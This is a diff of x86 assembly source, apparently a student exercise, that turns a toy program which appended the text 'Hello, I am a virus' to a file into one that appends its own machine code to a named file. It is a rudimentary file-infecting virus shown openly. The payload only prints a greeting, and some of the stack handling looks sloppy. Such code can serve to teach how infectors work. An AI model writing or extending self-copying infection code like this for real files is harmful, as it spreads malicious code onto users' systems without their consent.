@@ -2,8 +2,9 @@ section .data
 hello_message db 'Hello, Infected File', 0xA ; Message followed by newline character
 hello_len equ $-hello_message
 
-virus_message db 'Hello, I am a virus', 0xA
-virus_len equ $-virus_message
+newline db 0xA ; Newline character
+
+failMessage db 'Fail', 0 ; Define the string "Fail"
 
 section .bss
 file_descriptor resd 1 ; Reserve space for file descriptor (4 bytes)
@@ -13,6 +14,8 @@ global _start
 global system_call
 global infection
 global infector
+global start_code
+global end_code
 extern main
 extern strlen
 
@@ -53,16 +56,26 @@ system_call:
     ret ; Back to caller
 
 infection:
+start_code:
+	push ebp ; Save caller state
+    mov ebp, esp
+    pushad ; Save some more caller state
+
     mov eax, 4 ; System call number for write
     mov ebx, 1 ; File descriptor number for stdout
     mov ecx, hello_message ; Message to write
     mov edx, hello_len ; Number of bytes to write
     int 0x80 ; Call kernel
-    ret
 
+	popad ; Restore caller state (registers)
+	pop ebp ; Restore caller state
+    ret ; Back to caller
+    ret
+end_code:
 infector:
-    push ebp
+    push ebp ; Save caller state
     mov ebp, esp
+    pushad ; Save some more caller state
 
     ; Print file name
     
@@ -74,21 +87,24 @@ infector:
 	mov eax, 4 ; System call number for write
     int 0x80 ; Call kernel
 
-    ; Open file for appending
-    mov eax, 5 ; System call number for open
-    mov ebx, [ebp + 8] ; Pointer to filename
-    mov ecx, 2 | 1024 ; Flags (O_RDWR | O_APPEND)
-    mov edx, 0 ; Mode (not used)
-    int 0x80 ; Call kernel
-    cmp eax, 0
-    jl error ; If error opening file
-    mov [file_descriptor], eax ; Save file descriptor
+    pop eax; pop return value from strlen
 
-    ; Write virus message to file
+    ; Open the file for appending
+    mov eax, 5 ; System call number for open
+    mov ebx, [ebp + 8] ; The first parameter to open is the filename
+    mov ecx, 1025 ; The second parameter is the flags. 1025 = O_WRONLY | O_APPEND
+    int 0x80 ; Execute the system call
+
+    cmp eax, 0 ; Compare the file descriptor with 0
+    jl error ; If the file descriptor is less than 0 (indicating an error), jump to exit
+    mov [file_descriptor], eax ; Store the file descriptor
+
+    ; Add the virus executable code to the file
     mov eax, 4 ; System call number for write
     mov ebx, [file_descriptor] ; File descriptor number for infected file
-    mov ecx, virus_message ; Message to write
-    mov edx, virus_len ; Number of bytes to write
+    mov ecx, start_code ; Start of executable code
+    mov edx, end_code ; End of executable code
+    sub edx, ecx ; Calculate the size of the virus code
     int 0x80 ; Call kernel
 
     ; Close the file
@@ -96,10 +112,20 @@ infector:
     mov ebx, [file_descriptor] ; File descriptor to close
     int 0x80 ; Call kernel
 
-    pop ebp
+    popad ; Restore caller state (registers)
+	pop ebp ; Restore caller state
+    ret ; Back to caller
     ret
 
 error:
+     ; Write fail message to stdout
+    mov eax, 4 ; System call number for write
+    mov ebx, 1 ; File descriptor number for stdout
+    mov ecx, failMessage ; Pointer to the string
+    mov edx, 4 ; Number of bytes to write
+    int 0x80 ; Call kernel
+
+
     mov eax, 1
     mov ebx, 0x55
     int 0x80
